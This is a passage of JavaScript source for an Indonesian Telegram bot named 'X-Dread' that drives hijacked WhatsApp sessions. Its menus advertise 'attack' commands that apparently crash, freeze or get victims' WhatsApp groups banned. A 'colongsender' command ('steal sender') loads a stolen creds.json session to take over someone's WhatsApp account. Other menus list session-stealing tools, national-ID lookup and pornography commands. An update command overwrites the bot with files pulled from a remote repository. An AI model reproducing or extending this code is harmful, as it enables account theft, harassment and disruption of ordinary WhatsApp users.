<code>/anticulik autoreject</code> → Auto tolak + keluar grup

📌 *Status saat ini:* ${antiCulik ? (autoReject ? "🚫 AUTO REJECT" : "✅ AKTIF") : "❌ NONAKTIF"}
        `, { parse_mode: "HTML" });
    }

    if (args === "on") {
        antiCulik = true;
        autoReject = false;
        ctx.reply(`
<blockquote><b>✅ ANTI CULIK AKTIF</b></blockquote>

Bot akan mengirim notifikasi saat ditambahkan ke grup.
        `, { parse_mode: "HTML" });
    } 
    else if (args === "off") {
        antiCulik = false;
        ctx.reply(`
<blockquote><b>❌ ANTI CULIK NONAKTIF</b></blockquote>

Bot tidak akan mendeteksi penambahan ke grup.
        `, { parse_mode: "HTML" });
    } 
    else if (args === "autoreject") {
        antiCulik = true;
        autoReject = true;
        ctx.reply(`
<blockquote><b>🚫 AUTO REJECT AKTIF</b></blockquote>

Bot akan otomatis KELUAR + BAN pelaku saat ditambahkan ke grup!
        `, { parse_mode: "HTML" });
    }
});

// EVENT DETEKSI BOT DITAMBAHKAN KE GROUP
bot.on("my_chat_member", async (ctx) => {
    try {
        const status = ctx.update.my_chat_member.new_chat_member.status;
        
        // HANYA SAAT BOT JADI MEMBER/ADMIN (DITAMBAHKAN KE GROUP)
        if (status !== "member" && status !== "administrator") return;
        
        // JIKA ANTI CULIK MATI
        if (!antiCulik) return;

        const chat = ctx.chat;
        const groupId = chat.id;
        const groupName = chat.title || "Tidak ada nama";
        
        const from = ctx.update.my_chat_member.from;
        const userId = from.id;
        const username = from.username ? "@" + from.username : "Tidak ada";
        const fullName = `${from.first_name || ""} ${from.last_name || ""}`.trim();

        // JIKA MODE AUTO REJECT AKTIF
        if (autoReject) {
            try {
                await ctx.telegram.sendMessage(groupId, "🚫 Auto keluar (AntiCulik)");
                await ctx.telegram.banChatMember(groupId, userId).catch(()=>{});
                await ctx.telegram.leaveChat(groupId);
            } catch {}
            return;
        }

        // SIMPAN DATA PENDING
        pendingGroups.set(groupId, {
            userId: userId,
            username: username,
            fullName: fullName,
            groupName: groupName
        });

        // KIRIM NOTIF KE OWNER
        await ctx.telegram.sendMessage(ownerID, `
🚨 BOT DICULIK

📛 Grup : ${groupName}
🆔 ID   : ${groupId}

👤 Pelaku:
• Nama     : ${fullName}
• Username : ${username}
• ID       : ${userId}`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "✅ Izinkan", callback_data: `allow_${groupId}` },
                            { text: "❌ Tolak", callback_data: `deny_${groupId}` }
                        ]
                    ]
                }
            }
        );

    } catch (err) {
        console.log("AntiCulik error:", err);
    }
});

// HANDLE TOMBOL IZINKAN / TOLAK
bot.action(/(allow|deny)_(.+)/, async (ctx) => {
    if (ctx.from.id != ownerID) {
        return ctx.answerCbQuery("❌ Bukan owner!", { show_alert: true });
    }

    const action = ctx.match[1];
    const groupId = Number(ctx.match[2]);
    const data = pendingGroups.get(groupId);

    try { await ctx.deleteMessage(); } catch {}

    if (action === "allow") {
        pendingGroups.delete(groupId);
        await ctx.reply("✅ Bot diizinkan");
        try {
            await ctx.telegram.sendMessage(groupId, "✅ Bot diizinkan oleh owner");
        } catch {}
    }

    if (action === "deny") {
        pendingGroups.delete(groupId);
        await ctx.reply("❌ Bot ditolak");
        try {
            await ctx.telegram.sendMessage(groupId, "❌ Bot ditolak oleh owner");
            if (data?.userId) {
                await ctx.telegram.banChatMember(groupId, data.userId).catch(()=>{});
            }
            await ctx.telegram.leaveChat(groupId);
        } catch {}
    }
});


bot.command("killbot", async (ctx) => {
  if (ctx.from.id != ownerID) {
    return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
  }

  try {
    const sessionDirs = ["./session", "./sessions"];
    let deleted = false;

    for (const dir of sessionDirs) {
      if (fs.existsSync(dir)) {
        fs.rmSync(dir, { recursive: true, force: true });
        deleted = true;
      }
    }

    if (deleted) {
      await ctx.reply("✅ ☇ Session berhasil dihapus, panel akan restart");
      setTimeout(() => {
        process.exit(1);
      }, 2000);
    } else {
      ctx.reply("🪧 ☇ Tidak ada folder session yang ditemukan");
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ ☇ Gagal menghapus session");
  }
});

// ============ CLAIM PREMIUM DARI GROUP ============
// ============ CLAIM PREMIUM (LANGSUNG JADI) ============
bot.command("claim", async (ctx) => {
  const userId = ctx.from.id;
  const duration = 30; // 30 HARI
  
  // CEK APAKAH USER SUDAH PREMIUM
  if (isPremiumUser(userId)) {
    return ctx.reply("✅ Anda sudah menjadi premium user!");
  }
  
  // TAMBAHKAN PREMIUM
  const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
  const premiumUsers = loadPremiumUsers();
  premiumUsers[userId] = expiryDate;
  savePremiumUsers(premiumUsers);
  
  ctx.reply(`✅ Selamat! Anda sekarang premium selama ${duration} hari!\n📅 Expired: ${expiryDate}\n\nSilakan gunakan fitur bot.`);
});

bot.command('colongsender', async (ctx) => {
  const msg = ctx.message;
  const chatId = msg.chat.id;
  
  if (!isOwner(msg)) return ctx.reply('❌ Khusus owner we.');

  const doc = msg.reply_to_message?.document;
  if (!doc) return ctx.reply('❌ Balas file session atau creds.json + dengan /colongsender');

  const name = doc.file_name.toLowerCase();
  if (!['.json','.zip','.tar','.tar.gz','.tgz'].some(ext => name.endsWith(ext)))
    return ctx.reply('❌ File bukan session tolol.');

  await ctx.reply('🔄 Proses colong sender in you session…');

  const url = await bot.getFileLink(doc.file_id);
  const { data } = await axios.get(url, { responseType: 'arraybuffer' });
  const tmp = await fs.mkdtemp(path.join(os.tmpdir(), 'sess-'));

  if (name.endsWith('.json')) {
    await fs.writeFile(path.join(tmp, 'creds.json'), data);
  } else if (name.endsWith('.zip')) {
    new AdmZip(data).extractAllTo(tmp, true);
  } else {
    const tmpTar = path.join(tmp, name);
    await fs.writeFile(tmpTar, data);
    await tar.x({ file: tmpTar, cwd: tmp });
  }

  const credsPath = await findCredsFile(tmp);
  if (!credsPath) return ctx.reply('❌ creds.json tidak ditemukan bego');

  const creds = await fs.readJson(credsPath);
  const botNumber = creds.me.id.split(':')[0];

  await fs.remove(destDir);
  await fs.copy(tmp, destDir);
  saveActiveSessions(botNumber);

  const auth = await useMultiFileAuthState(destDir);
  await connectToWhatsApp(botNumber, chatId, auth);

  return ctx.reply(`*SUCCES CONNECTING🫀*
  NUMBER : ${botNumber}
  *ANJAYYY KEMALING🗿*`);
});

bot.command('delprem', async (ctx) => {
    // CEK APAKAH OWNER ATAU ADMIN
    if (ctx.from.id != ownerID && !isAdminUser(ctx.from.id)) {
        return ctx.reply("❌ ☇ Akses hanya untuk owner atau admin");
    }
    
    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
        return ctx.reply("🪧 ☇ Format: /delprem 12345678");
    }
    const userId = args[1];
    removePremiumUser(userId);
    ctx.reply(`✅ ☇ ${userId} telah berhasil dihapus dari daftar pengguna premium`);
});

bot.start(async (ctx) => {
  try {
    await ctx.telegram.setMessageReaction(
      ctx.chat.id,
      ctx.message.message_id,
      [{ type: "emoji", emoji: "👾" }],
      false
    );

        const senderStatus = isWhatsAppConnected ? "Yes" : "No";
        const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
        const runtimeStatus = formatRuntime();
        const isPrivate = ctx.chat?.type === 'private';
        const CONFETTI_ID = "5104841245755180586";
        const memoryStatus = formatMemory();
        const cooldownStatus = loadCooldown();
        const username = ctx.from?.username ? `@${ctx.from.username}` : "Tidak ada username";
        let message_effect_id;

    const menuMessage = `\`\`\`javascript 
  ⌜ χ-ɖʀєαɖ ⌟ 

╭─【 χ-ɖʀєαɖ 】─╮
   Halo Bang ${username}  
   Selamat menggunakan 
   "χ-ɖʀєαɖ"  
   Gunakan dengan bijak ya
╰───────────────────────╯

⋆ information ⋆
• Developer : @RazzxyBack
• Version : 2
• Runtime : ${runtimeStatus}
• Sender : ${senderStatus} 
ᝰ.ᐟ Always read the info provided  
ᝰ.ᐟ Tap one of the buttons below to start
© χ-ɖʀєαɖ\`\`\``;

    
  const keyboard = [
  [
      { text: "ᴛᴏᴏʟꜱ ᴍᴇɴᴜ", callback_data: "/controls", style: "Danger"},
      { text: "ᴀᴛᴛᴀᴄᴋ ᴍᴇɴᴜ", callback_data: "/bug", style: "Success"}
  ],
  [
      { text: "ᴄᴏɴᴛʀᴏʟꜱ ᴍᴇɴᴜ", callback_data: "/owner", style: "Danger"},
      { text: "ᴛʜᴀɴᴋꜱ ᴛᴏ", callback_data: "/tqto", style: "Success"}
  ],
  [
      { text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/Razzxyubot", style: "Primary"},
      { text: "ɪɴꜰᴏ ꜱᴄʀɪᴘᴛ", url: "https://t.me/XdreadTeam", style: "Primary"}
  ]
];

      await ctx.replyWithPhoto(StartUrl, {
      caption: menuMessage,
      message_effect_id: isPrivate ? CONFETTI_ID : null,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: keyboard }
    });

    console.log("Bot Jalan");
  } catch (error) {
    console.error("Gagal:", error);
  }
});

bot.command("claim", async (ctx) => {
  const userId = ctx.from.id;
  const duration = 30; // 30 HARI
  
  // CEK APAKAH USER SUDAH PREMIUM
  if (isPremiumUser(userId)) {
    return ctx.reply("✅ Anda sudah menjadi premium user!");
  }
  
  // TAMBAHKAN PREMIUM
  const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
  const premiumUsers = loadPremiumUsers();
  premiumUsers[userId] = expiryDate;
  savePremiumUsers(premiumUsers);
  
  ctx.reply(`✅ Selamat! Anda sekarang premium selama ${duration} hari!\n📅 Expired: ${expiryDate}\n\nSilakan gunakan fitur bot.`);
});

bot.action('/start', async (ctx) => {
    try {
    
        const senderStatus = isWhatsAppConnected ? "Yes" : "No";
        const premiumStatus = isPremiumUser(ctx.from.id) ? "Yes" : "No";
        const runtimeStatus = formatRuntime();
        const isPrivate = ctx.chat?.type === 'private';
        const CONFETTI_ID = "5104841245755180586";
        const memoryStatus = formatMemory();
        const cooldownStatus = loadCooldown();
        const username = ctx.from?.username ? `@${ctx.from.username}` : "Tidak ada username";
        let message_effect_id;

if (ctx.chat?.type === "private") {
  message_effect_id =
    menuEffects[Math.floor(Math.random() * menuEffects.length)];
}

        const menuMessage = `\`\`\`javascript 
  ⌜ χ-ɖʀєαɖ ⌟ 

╭─【 χ-ɖʀєαɖ 】─╮
   Halo Bang ${username}  
   Selamat menggunakan 
   "χ-ɖʀєαɖ"  
   Gunakan dengan bijak ya
╰───────────────────────╯

⋆ information ⋆
• Developer : @RazzxyBack
• Version : 2
• Runtime : ${runtimeStatus}
• Sender : ${senderStatus} 
ᝰ.ᐟ Always read the info provided  
ᝰ.ᐟ Tap one of the buttons below to start
© χ-ɖʀєαɖ\`\`\``;

    
  const keyboard = [
  [
      { text: "ᴛᴏᴏʟꜱ ᴍᴇɴᴜ", callback_data: "/controls", style: "Danger"},
      { text: "ᴀᴛᴛᴀᴄᴋ ᴍᴇɴᴜ", callback_data: "/bug", style: "Success"}
  ],
  [
      { text: "ᴄᴏɴᴛʀᴏʟꜱ ᴍᴇɴᴜ", callback_data: "/owner", style: "Danger"},
      { text: "ᴛʜᴀɴᴋꜱ ᴛᴏ", callback_data: "/tqto", style: "Success"}
  ],
  [
      { text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url: "https://t.me/Razzxyubot", style: "Primary"},
      { text: "ɪɴꜰᴏ ꜱᴄʀɪᴘᴛ", url: "https://t.me/XdreadTeam", style: "Primary"}
  ]
];

    await ctx.editMessageMedia(
      {
        type: "photo",
        media: StartUrl,
        message_effect_id: isPrivate ? CONFETTI_ID : null,
        caption: menuMessage,
        parse_mode: "Markdown"
      },
      {
        reply_markup: { inline_keyboard: keyboard }
      }
    );
  } catch (err) {
    console.error(err);
    await ctx.reply("❌ Anjay Error.");
  }
});

bot.action('/controls', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
  const CONFETTI_ID = "5104841245755180586";
    const controlsMenu = `
<blockquote><b>𝗧𝗢𝗢𝗟𝗦 𝗠𝗘𝗡𝗨</b></blockquote>
<blockquote><b>〣 /mediafire - convert MediaFire 
〣 /trackip - IP Information
〣 /tiktok - Tiktok Downloader
〣 /igdl - Instagram Downloader
〣 /nikparse - Nik Infomation
〣 /csessions - Colong Session#1
〣 /getsender - Colong Session#2
〣 /convert - To Url Media
〣 /brat - Quotes Sticker
〣 /yt - YouTube Search
〣 /gethtml - Get Code HTML
〣 /cekefek - Checking Effect Function
〣 /sendbokep - bkp random
〣 /tesfunc - test func
╘═—————————————–——═⬡</b></blockquote>
`;

    const keyboard = [
        [
            {
                text: "ʙᴀᴄᴋ",
                callback_data: "/start",
                style: "Danger"
            },
            {
                text: "ᴛᴏᴏʟꜱ ᴍᴇɴᴜ ᴠ2", callback_data: "/toolss", style: "Success"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: toolsUrl,
                message_effect_id: isPrivate ? CONFETTI_ID : null,
                caption: controlsMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/toolss', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
  const CONFETTI_ID = "5046509860389126442";
    const toolssMenu = `
<blockquote><b>𝗧𝗢𝗢𝗟𝗦 𝗩𝟮</b></blockquote>
<blockquote><b>〣 /deploy - Convert Web To Apps
〣 /remove - Fitur Bokep Ini Ajg
〣 /cekbio - Cek Bio Wa
〣 /cekbiotele - Cek Bio Telegram
〣 /anime - Searching Anime
〣 /waifu - Get Waifu Anime
〣 /nsfwwaifu - Waifu Ver Bokep
〣 /iqc - Screen WA Iphone
〣 /getnsfw - Bokep Anime#2
〣 /cekfile - Cek Nokos Via File
〣 /cekgaleri - Cek Galeri WA
〣 /cekkontak - Cek Kontak
〣 /toblur - blur foto
〣 /info - your id
〣 /videy - Bokep Lagi Ni memek
〣 /cekfunc - cek eror func
〣 /openfile - buka file
╘═—————————————–——═⬡</b></blockquote>

`;

    const keyboard = [
        [
            {
                text: "ʙᴀᴄᴋ",
                callback_data: "/start",
                style: "Danger"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: toolsUrl,
                message_effect_id: isPrivate ? CONFETTI_ID : null,
                caption: toolssMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/owner', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
  const CONFETTI_ID = "5046509860389126442";
    const bugMenu = `<blockquote><b>𝗖𝗢𝗡𝗧𝗥𝗢𝗟𝗦 𝗠𝗘𝗡𝗨</b></blockquote>
<blockquote><b>𖤓 /addbot - Add Sender
𖤓 /setcd - Set Cooldown
𖤓 /killbot - Reset Session
𖤓 /update - Update Otomatis
𖤓 /addadmin - Add Admin
𖤓 /deladmin - Delete Admin
𖤓 /listadmin - List Admin
𖤓 /addprem - Add Prem
𖤓 /delprem - Delete Prem
𖤓 /listprem - List Premium
𖤓 /linkgb - linkgb 1 kali pke
𖤓 /addch - menambah ch
𖤓 /addgrouppremium - add group
𖤓 /anticulik - biar bot ga di culik
𖤓 /cmd - melihat menu bug 
𖤓 /unblockcmd - unlock menu
𖤓 /blockcmd - blokir menu</b></blockquote>`;

    const keyboard = [
    [
        {
            text: "ʙᴀᴄᴋ",
            callback_data: "/start",
            style: "Danger"
        }
    ]
];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: menuUrl,
                caption: bugMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

// 1 menu bug
bot.action('/bug', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
    const CONFETTI_ID = "5046509860389126442";
    
    const cmdStatus = `
╭━〔 𝗡𝗢 𝗦𝗣𝗔𝗠 𝗠𝗘𝗡𝗨 〕━━━━━━━━━╮
│𖤓 /crasher - ʙᴜʟᴅᴏᴢᴇʀ ➜ ${getCmdStatus("crasher")}
│𖤓 /xdread - ʙʟᴀɴᴋ ➜ ${getCmdStatus("xdread")}
│𖤓 /xcrot - ꜰʀᴇᴢᴇ ʜᴀʀᴅ ➜ ${getCmdStatus("xcrot")}
│𖤓 /pentol - ᴄᴏᴍʙᴏ ➜ ${getCmdStatus("pentol")}
│𖤓 /crash - ᴄʀᴀꜱʜ ɴᴏ ᴄʟɪᴄᴋ ➜ ${getCmdStatus("crash")}
╰━━━━━━━━━━━━━━━━━━━━━━━━━╯
`;

    const bug3Menu = `<pre>${cmdStatus}</pre>`;
    
    const keyboard = [
        [
            {
                text: "ʙᴇʙᴀꜱ ꜱᴘᴀᴍ ᴍᴇɴᴜ",
                callback_data: "/bug3",
                style: "Primary",
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: bugUrl,
                message_effect_id: isPrivate ? CONFETTI_ID : null,
                caption: bug3Menu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/bug3', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
    const CONFETTI_ID = "5046509860389126442";
    
    const cmdStatus = `
╭━〔 𝗕𝗘𝗕𝗔𝗦 𝗦𝗣𝗔𝗠 𝗠𝗘𝗡𝗨 〕━━━━━━━━━╮
│𖤓 /xbakso - ʙᴇʙᴀꜱ ꜱᴘᴀᴍ ➜ ${getCmdStatus("xbakso")}
│𖤓 /Xdelay - ʙᴇʙᴀꜱ ꜱᴘᴀᴍ ➜ ${getCmdStatus("Xdelay")}
│𖤓 /slayerdelay - ʙᴇʙᴀꜱ ꜱᴘᴀᴍ ➜ ${getCmdStatus("slayerdelay")}
│𖤓 /spamkiller - ʙᴇʙᴀꜱ ꜱᴘᴀᴍ ➜ ${getCmdStatus("spamkiller")}
│𖤓 /Xcline - ʙᴇʙᴀꜱ ꜱᴘᴀᴍ ➜ ${getCmdStatus("Xcline")}
│𖤓 /Xbugs - ʙᴇʙᴀꜱ ꜱᴘᴀᴍ ➜ ${getCmdStatus("Xbugs")}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
`;

const bug4Menu = `<pre>${cmdStatus}</pre>`;
    
    const keyboard = [
        [
            {
                text: "ʙᴀɴᴅ ɢʀᴏᴜᴘ ᴍᴇɴᴜ",
                callback_data: "/bandgb",
                style: "Primary",
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: bugUrl,
                message_effect_id: isPrivate ? CONFETTI_ID : null,
                caption: bug4Menu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/bandgb', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
    const CONFETTI_ID = "5046509860389126442";
    
    const cmdStatus = `
╭━〔 𝗕𝗔𝗡𝗗 𝗚𝗥𝗢𝗨𝗣 𝗠𝗘𝗡𝗨 〕━━━━━━━━━╮
│𖤓 /groupban - ʙᴀɴᴅ ɢʀᴏᴜᴘ ᴍᴇɴᴜ ➜ ${getCmdStatus("groupban")}
╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
`;
    const bug5Menu = `<pre>${cmdStatus}</pre>`;
    
    const keyboard = [
        [
            {
                text: "ɪɴꜰᴏʀᴍᴀꜱɪ",
                callback_data: "/info",
                style: "Danger",
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: bugUrl,
                message_effect_id: isPrivate ? CONFETTI_ID : null,
                caption: bug5Menu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/info', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
  const CONFETTI_ID = "5046509860389126442";
    const info = `
<pre>╭━〔 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗨𝗣𝗗𝗔𝗧𝗘 〕━━━━━━━━━╮
│𖤓 MINIMAL JEDA 10/20 DTIK 
│𖤓 JANGAN START PAS LAGI KIRIM BUG BEGO
│𖤓 ALL CMD ADA BEBAS/NO SPAM
│𖤓 UNTUK YANG BEBAS SPAM GW KECILIN LOOPNYA DAN JUGA NO SPAM
│𖤓 ALL FUNCTION DAH GW FIX
│𖤓 UPDATE OTOMATIS KETIK /update
╰━━━━━━━━━━━━━━━━━━━━━━━╯</pre>`;
//bugmenuanjing
    const keyboard = [
    [
        {
            text: "ʙᴀᴄᴋ",
            callback_data: "/start",
            style: "Danger"
        }
    ]
];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: bugUrl,
                message_effect_id: isPrivate ? CONFETTI_ID : null,
                caption: info,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const isPrivate = ctx.chat?.type === 'private';
  const CONFETTI_ID = "5046509860389126442";
    const tqtoMenu = `
<blockquote><b>𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢
〣 @RazzxyBack - DEVELOPER
〣 ORTU - SUPORT
〣 ALL SUPPORT χ-ɖʀєαɖ 
〣 ALL MEMBER GW - SUPORT
——————————————═⬡</b></blockquote>`;

    const keyboard = [
        [
            {
                text: "ʙᴀᴄᴋ",
                callback_data: "/start",
                style: "Danger"
            }
        ]
    ];

    try {
        await ctx.editMessageMedia(
            {
                type: "photo",
                media: tqtoUrl,
                message_effect_id: isPrivate ? CONFETTI_ID : null,
                caption: tqtoMenu,
                parse_mode: "HTML"
            },
            {
                reply_markup: { inline_keyboard: keyboard }
            }
        );
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
            console.error(error);
        }
    }
});

//------------ CASE TOOLS ---------------//
bot.on('callback_query', async (ctx) => {
    const data = ctx.callbackQuery.data;
    
    console.log(`[CALLBACK] Received: ${data} from user: ${ctx.from.id}`);
    
    if (data.startsWith('addprem_')) {
        console.log('[CALLBACK] Processing addprem button...');
        
        // GANTI INI: dari ownerID ke isAdminUser
        if (!isAdminUser(ctx.from.id)) {
            console.log(`[CALLBACK] User ${ctx.from.id} is not admin`);
            await ctx.answerCbQuery("❌ Akses ditolak", { show_alert: true });
            return;
        }
        
        const parts = data.split('_');
        if (parts.length < 3) {
            console.log('[CALLBACK] Invalid data format');
            await ctx.answerCbQuery("❌ Data tidak valid", { show_alert: true });
            return;
        }
        
        const userId = parts[1];
        const duration = parseInt(parts[2]);
        
        console.log(`[CALLBACK] Adding premium: ${userId} for ${duration} days`);
        
        // Proses add premium
        const expiryDate = addPremiumUser(userId, duration);
        
        // Edit pesan asli untuk hapus tombol
        try {
            await ctx.editMessageText(
                `✅ <b>Premium Berhasil Ditambahkan</b>\n` +
                `• User: <code>${userId}</code>\n` +
                `• Durasi: ${duration} hari\n` +
                `• Berakhir: ${expiryDate}`,
                { 
                    parse_mode: "HTML",
                    reply_markup: { inline_keyboard: [] }
                }
            );
            console.log('[CALLBACK] Message edited successfully');
        } catch (error) {
            console.error('[CALLBACK] Error editing message:', error);
            // Coba kasih feedback ke user
            try {
                await ctx.answerCbQuery("✅ Premium berhasil ditambahkan");
            } catch (e) {}
            return;
        }
        
        await ctx.answerCbQuery("✅ Premium berhasil ditambahkan");
        console.log('[CALLBACK] Callback answered');
        
        // Beri notifikasi ke user
        try {
            await ctx.telegram.sendMessage(
                userId,
                `🎉 <b>Selamat!</b>\n` +
                `Anda sekarang pengguna Premium χ-ɖʀєαɖ!\n` +
                `• Durasi: ${duration} hari\n` +
                `• Berakhir: ${expiryDate}`,
                { parse_mode: "HTML" }
            );
            console.log(`[CALLBACK] Notification sent to ${userId}`);
        } catch (error) {
            console.log('[CALLBACK] Cannot send notification to user:', error.message);
        }
        
        console.log('[CALLBACK] Process completed');
    }
    
    // CALLBACK TIKTOK MEK
    
    else if (data.startsWith("tiktok_download|")) {
    const parts = data.split("|");
    const type = parts.pop(); // Ambil elemen terakhir (video/hd/audio)
const url = parts.slice(1).join("|"); // Gabungkan kembali sisa bagian URL
    
    // Konfirmasi pemrosesan
    await ctx.answerCbQuery("⏳ Memproses permintaan...");
    
    // Edit pesan untuk menampilkan status
    await ctx.editMessageText(`⏳ Sedang memproses ${getTypeName(type)}...`);
    
    try {
      const result = await downloadTikTok(url, type);
      
      if (result.success) {
        // Kirim file sesuai tipe
        if (type === 'audio') {
          await ctx.replyWithAudio(
            { source: Buffer.from(result.data), filename: 'tiktok_audio.mp3' },
            { title: 'TikTok Audio', performer: 'TikTok Downloader' }
          );
        } else {
          await ctx.replyWithVideo(
            { source: Buffer.from(result.data), filename: `tiktok_${type}.mp4` },
            { 
              supports_streaming: true,
              caption: `✅ Berhasil diunduh\n📁 Tipe: ${getTypeName(type)}`
            }
          );
        }
        
        // Hapus pesan status
        await ctx.deleteMessage();
        
      } else {
        await ctx.editMessageText(`❌ Gagal: ${result.error}`);
      }
      
    } catch (error) {
      await ctx.editMessageText(`❌ Error: ${error.message}`);
    }
  }

});

const GH_OWNER = 'razzxy6-creator';
const GH_REPO = "RAZZXY-DATABASE";
const GH_BRANCH = "main";

async function downloadRepo(dir = "", basePath = "/home/container", fileList = []) {
    const url = `https://api.github.com/repos/${GH_OWNER}/${GH_REPO}/contents/${dir}?ref=${GH_BRANCH}`;
    
    const { data } = await axios.get(url, {
        headers: {
            "User-Agent": "Mozilla/5.0"
        }
    });

    for (const item of data) {
        const local = path.join(basePath, item.path);

        if (item.type === "file") {
            const fileData = await axios.get(item.download_url, { responseType: "arraybuffer" });
            fs.mkdirSync(path.dirname(local), { recursive: true });
            fs.writeFileSync(local, Buffer.from(fileData.data));

            console.log("[MENGAMBIL FILE NEW]", item.path);
            fileList.push(item.path); // simpan nama file
        }

        if (item.type === "dir") {
            fs.mkdirSync(local, { recursive: true });
            await downloadRepo(item.path, basePath, fileList);
        }
    }

    return fileList;
}

bot.command("update", checkAdmin, async (ctx) => {
    const chat = ctx.chat.id;
    await ctx.reply("🔄 Sedang Mengambil file... mohon tunggu");

    try {
        const files = await downloadRepo("");

        // Ambil beberapa file aja biar ga kepanjangan
        const preview = files.slice(0, 10).map(f => `📄 ${f}`).join("\n");

        await ctx.reply(
`✅ 𝙎𝙐𝙆𝙎𝙀𝙎 𝙐𝙋𝘿𝘼𝙏𝙀 
📂 𝙏𝙊𝙏𝘼𝙇 𝙁𝙄𝙇𝙀: ${files.length}
${preview}${files.length > 10 ? "\n..." : ""}
🔁 𝙎𝘼𝘽𝘼𝙍 𝘽𝙊𝙏 𝙉𝙔𝘼 𝙍𝙀𝙎𝙏𝘼𝙍𝙏 𝘿𝙐𝙇𝙐...
⛔ INFOO : BACA GROUP SCRIPT UNTUK MENGETAHUI UPDATE!`
        );

        setTimeout(() => process.exit(0), 1500);

    } catch (e) {
        await ctx.reply("❌ Gagal update, cek repo GitHub atau koneksi.");
        console.log(e);
    }
});

// spotifyplay
bot.command("spotifyplay", checkPremium, async (ctx) => {
  try {
    const input = ctx.message.text.split(" ").slice(1).join(" ");
    if (!input) {
      return ctx.reply("❌ Masukkan judul lagu atau link Spotify.\n\nContoh:\n/spotifyplay Hadroh Ramadhan Tiba");
    }

    const loading = await ctx.reply("🔍 Mencari lagu...");

    let spotifyUrl;

    if (input.includes("open.spotify.com")) {
      spotifyUrl = input;
    }

    else {
      const search = await axios.get(
        "https://ikyyzyyrestapi.my.id/search/spotify",
        {
          params: { query: input },
          timeout: 60000
        }
      );

      if (!search.data?.status || !search.data?.tracks?.length) {
        await ctx.deleteMessage(loading.message_id).catch(() => {});
